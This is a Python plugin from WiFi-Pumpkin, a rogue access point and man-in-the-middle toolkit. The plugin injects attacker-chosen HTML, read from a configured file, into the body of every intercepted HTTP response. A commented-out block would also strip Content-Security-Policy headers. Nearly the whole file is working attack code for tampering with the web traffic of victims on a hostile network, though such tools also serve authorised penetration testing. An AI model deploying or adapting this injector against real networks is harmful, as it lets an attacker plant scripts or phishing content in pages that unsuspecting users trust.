from os import path
from mitmproxy.models import decoded
from plugins.extension.plugin import PluginTemplate,BeautifulSoup

"""
Description:
    This program is a core for wifi-pumpkin.py. file which includes functionality
    plugins for Pumpkin-Proxy.

Copyright:
    Copyright (C) 2015-2016 Marcos Nesster P0cl4bs Team
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>
"""

class html_inject(PluginTemplate):
    meta = {
        'Name'      : 'html_inject',
        'Version'   : '1.1',
        'Description' : 'inject arbitrary HTML code into a vulnerable web page.',
        'Author'    : 'by Maintainer'
    }
    def __init__(self):
        for key,value in self.meta.items():
            self.__dict__[key] = value
        self.ConfigParser = True
        self.filehtml   = self.config.get_setting('set_html_inject','content_path')
        self.isfilePath  = False
        if path.isfile(self.filehtml):
            self.isfilePath = True
            self.content = open(self.filehtml,'r').read()
    def request(self, flow):
        pass

    def response(self,flow):
        if self.isfilePath:
            with decoded(flow.response):  # Remove content encoding (gzip, ...)
                html = BeautifulSoup(flow.response.content.decode('utf-8', 'ignore'),'lxml')
                """
                # To Allow CORS
                if "Content-Security-Policy" in flow.response.headers:
                    del flow.response.headers["Content-Security-Policy"]
                """
                if html.body:
                    temp_soup = BeautifulSoup(self.content,'lxml')

                    html.body.insert(len(html.body.contents), temp_soup)
                    flow.response.content = str(html)
                    return self.send_output.emit("[{}] [Request]: {} | injected ".format(self.Name,flow.request.pretty_host))
        else:
            return self.send_output.emit("[{}] Error Path file not found ".format(self.Name))